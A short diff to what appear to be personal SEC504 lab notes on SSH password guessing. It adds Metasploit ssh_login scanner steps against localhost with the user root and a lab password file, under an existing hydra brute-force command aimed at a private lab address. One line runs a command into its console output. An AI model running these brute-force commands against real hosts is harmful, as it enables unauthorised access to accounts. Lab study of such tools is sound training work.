@@ -29,3 +29,13 @@ hydra -t 4 -L eusers.txt -P passwords.txt ssh://172.30.0.25
 
 with metasploit
 
+```
+msfconsole
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 127.0.0.1
+set username root
+set password sec504
+set gatherproof false
+unset password
+set PASS_FILE /home/sec504/labs/passhydra/passwords.txtPASS_FILE => /home/sec504/labs/passhydra/passwords.txt
+```
